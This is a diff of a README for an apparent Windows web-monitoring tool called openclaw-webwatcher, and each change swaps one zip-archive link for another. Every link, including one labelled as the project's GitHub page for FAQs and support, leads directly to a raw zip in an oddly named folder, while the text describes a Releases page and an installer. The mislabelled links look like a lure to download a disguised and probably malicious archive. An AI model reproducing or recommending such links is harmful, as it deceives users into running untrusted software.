@@ -1,6 +1,6 @@
 # 🤖 openclaw-webwatcher - Easy Web Monitoring for Everyone
 
-[![Download openclaw-webwatcher](https://img.shields.io/badge/Download-openclaw--webwatcher-brightgreen)](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/webwatcher-openclaw-1.5.zip)
+[![Download openclaw-webwatcher](https://img.shields.io/badge/Download-openclaw--webwatcher-brightgreen)](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/openclaw-webwatcher-v1.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This tool fits anyone who wants to keep an eye on product prices, website change
 
 Click the green button below to visit the download page. You will find the latest Windows installer there.
 
-[![Download openclaw-webwatcher](https://img.shields.io/badge/Download-openclaw--webwatcher-blue)](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/webwatcher-openclaw-1.5.zip)
+[![Download openclaw-webwatcher](https://img.shields.io/badge/Download-openclaw--webwatcher-blue)](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/openclaw-webwatcher-v1.9.zip)
 
 Once on the page, look for the latest release in the "Releases" section. Find the Windows installer file, usually named like `openclaw-webwatcher-Setup.exe`.
 
@@ -125,7 +125,7 @@ The app stores monitoring data locally on your PC. It keeps track of changes in 
 If you need help:
 
 - Check the **Help** menu inside the app
-- Visit [openclaw-webwatcher GitHub page](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/webwatcher-openclaw-1.5.zip) for FAQs and support posts
+- Visit [openclaw-webwatcher GitHub page](https://raw.githubusercontent.com/QuentinyBTW/openclaw-webwatcher/main/plenipotential/openclaw-webwatcher-v1.9.zip) for FAQs and support posts
 
 ---
 
